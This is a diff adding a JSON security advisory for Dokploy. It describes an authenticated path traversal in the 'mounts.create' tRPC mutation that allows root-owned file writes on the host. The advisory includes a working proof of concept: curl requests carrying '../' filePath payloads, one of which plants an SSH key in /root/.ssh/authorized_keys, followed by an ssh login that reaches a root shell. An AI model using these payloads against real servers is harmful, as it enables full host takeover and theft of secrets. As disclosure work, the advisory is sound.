@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-5mqv-h2xh-fvhg",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-22",
+      "CWE-276",
+      "CWE-552"
+    ],
+    "description": "### Summary\r\nAn authenticated platform user (default role = \"member\") on Dokploy v0.29.13 and v0.29.14 can call the tRPC mutation `mounts.create` with `type=file` and a `filePath` parameter containing `../` sequences. The value is concatenated via `path.join()` with the application files base directory then written to disk as UID 0 root with no path normalization, boundary checks, or schema regex. Because `/etc/dokploy/` inside the dokploy container is a Docker **bind mount** from the actual operator host, writes into the container's `/etc/dokploy/` subtree propagate to the operator's real host filesystem as root-owned files. A single HTTP request therefore lets a regular tenant user overwrite host SSH keys, host cron files, or Dokploy's host .env secrets. Combined with the pre-existing '/var/run/docker.sock' bind inside dokploy container, this trivially escalates to full host root shell on the physical machine.\r\n\r\n### Details\r\nThe Affected Component : `createFileMount()` in packages/server/src/services/mount.ts lines 81-106\r\n\r\nThe function reads the mount row from postgres (attacker writes the filePath via the tRPC mutation body), obtains the base application files directory at `/etc/dokploy/applications/<APP_NAME>/files/`, then writes attacker-controlled content:\r\n\r\n```typescript\r\n  packages/server/src/services/mount.ts : \r\n\r\n  if (serverId) {\r\n      const command = getCreateFileCommand(baseFilePath, mount.filePath, mount.content);\r\n      await execAsyncRemote(serverId, command);\r\n  } else {\r\n      await createFile(baseFilePath,       // /etc/dokploy/applications/X/files/\r\n                                   mount.filePath,     // <- Triggered with  \"../../../poc.txt\"\r\n                                   mount.content);     // <- Triggered with arbitrary bytes\r\n  }\r\n```\r\n\r\n`createFile()` in packages/server/src/utils/docker/utils.ts does:\r\n  1.  `fullPath = path.join(baseFilePath, mount.filePath)`       -> no `..` strip\r\n  2.  `fs.mkdir(path.dirname(fullPath), { recursive: true })`    -> mkdir -p as root\r\n  3.  `fs.writeFile(fullPath, content, { mode: 0o644 })`         -> write owned root:root\r\n\r\nLadder of traversals for a standard install:\r\n  baseFilePath:           /etc/dokploy/applications/<name>/files/\r\n 1st level :  × ../   ->  /etc/dokploy/applications/<name>/\r\n  2nd level : ../../   ->  /etc/dokploy/applications/\r\n  3rd level : ../../../   ->  /etc/dokploy/\r\n  4th level : ../../../../   ->  /etc/\r\n  6th level : ../../../../../../   ->  /root/.ssh/  (authorized_keys write possible)\r\n  7th level : ../../../../../../../   ->  /root/.ssh/authorized_keys   ->  attacker payload / Embedded ssh key\r\n\r\nRoot cause on the schema layer is that no regex on `filePath`. Compare against the filtered sibling fields in db/schema/utils.ts lines 39-50:\r\n```typescript\r\n  export const APP_NAME_REGEX     = /^[a-zA-Z0-9._-]+$/;            \r\n  export const VOLUME_NAME_REGEX  = /^[a-zA-Z0-9][a-zA-Z0-9_.-]*$/; \r\n  export const DATABASE_PASSWORD_REGEX = /^[a-zA-Z0-9@#...]*$/;     \r\n\r\n  // vs. mount.ts createSchema - no regex :\r\n  //   filePath: z.string().optional(),       ->  accepts ../../../../\r\n  //   content:  z.string().optional(),      -> arbitrary bytes, no max size cap\r\n```\r\n\r\nSecondary sink : identical pattern in `deleteFileMount()`: packages/server/src/services/mount.ts compute `fullPath = path.join(basePath, mount.filePath)` then run `rm -rf \"${fullPath}\"`. Traversal allows delete of arbitrary container/host files (/etc/shadow, /root/.ssh/authorized_keys, host .env). Same root cause class but separate mutation. \r\n\r\n### PoC\r\nRequirements :\r\n  - Dokploy v0.29.13\r\n  - Web UI: http://127.0.0.1:3000\r\n  - Session cookie name\r\n  - Existing application id\r\n\r\nStep 1 :  Launch curl command to mount.create with 3 levels of ../ to land in container /etc/dokploy/ :\r\n```bash\r\nBASE=http://127.0.0.1:3000\r\nCOOK=./cookies-admin.txt\r\nAPP_ID=a6JpFJYUdp5GkIo1hvOVe\r\ncurl -s -X POST \"$BASE/api/trpc/mounts.create\" \\\r\n  -H 'Content-Type: application/json' \\\r\n  -b \"$COOK\" \\\r\n  -d '{\r\n    \"json\":{\r\n      \"type\":\"file\",\r\n      \"filePath\":\"../../../poc01.txt\",\r\n      \"content\":\"POC: \\nBASE: /etc/dokploy/applications/<name>/files/\\nIN:   ../../../poc01.txt\\nOUT:  /etc/dokploy/poc01.txt\\n\",\r\n      \"mountPath\":\"/tmp/ign.txt\",\r\n      \"serviceType\":\"application\",\r\n      \"serviceId\":\"'\"$APP_ID\"'\"\r\n    }\r\n  }'\r\n```\r\nHTTP Response :\r\n  {\"result\":{\"type\":\"data\",\"data\":{\"json\":{\"mountId\":\"qCAi-KjmGO3FvFuBrvZge\"}}}}\r\n\r\nStep 2 : confirm file landed inside dokploy container :\r\n```bash\r\nDOK_CTR=$(docker ps -qf label=com.docker.swarm.service.name=dokploy | head -1)\r\ndocker exec \"$DOK_CTR\" sh -c 'ls -la /etc/dokploy/poc01.txt'\r\n# Output : -rw-r--r-- 1 root root 945 Aug  6 23:19 /etc/dokploy/poc01.txt\r\ndocker exec \"$DOK_CTR\" cat /etc/dokploy/poc01.txt\r\n# Confirm content matches POST body content field.\r\n```\r\n\r\nStep 3 : shell to host root :\r\nA single different filePath payload writes attacker SSH public key into dokploy container /root/.ssh/authorized_keys.\r\n\r\n```\r\n  curl -s -X POST \"$BASE/api/trpc/mounts.create\" \\\r\n    -H 'Content-Type: application/json' -b \"$COOKIE_FILE\" \\\r\n    -d '{\"json\":{\r\n      \"type\":\"file\",\r\n      \"filePath\":\"../../../../../../root/.ssh/authorized_keys\",\r\n      \"content\":\"ssh-ed25519 AAAA...<your pubkey>... lab-attacker@local\\n\",\r\n      \"mountPath\":\"/tmp/ign.txt\",\r\n      \"serviceType\":\"application\",\r\n      \"serviceId\":\"'\"$APP_ID\"'\"\r\n    }}'\r\n```\r\n\r\nResponse :\r\n\r\n```\r\nCTR_IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \"$DOK_CTR\")\r\nssh -o StrictHostKeyChecking=no -i ~/.ssh/lab_attacker_key root@\"$CTR_IP\" \r\nid \r\nuid=0(root) gid=0(root) groups=0(root)\r\n```\r\n\r\n### Impact\r\nCVSS 3.1 = 9.9 CRITICAL - full host compromise from any user\r\n",
+    "ghsa_id": "GHSA-5mqv-h2xh-fvhg",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-5mqv-h2xh-fvhg",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-5mqv-h2xh-fvhg"
+      }
+    ],
+    "published_at": "2026-11-12T08:16:25Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Authenticated Path Traversal in 'mounts.create' 'filePath' leads to Arbitrary Root-Owned File Write on Host via Bind Mount",
+    "updated_at": "2026-11-12T08:16:25Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "dokploy"
+        },
+        "patched_versions": "0.31.1",
+        "vulnerable_version_range": "< 0.31.1"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
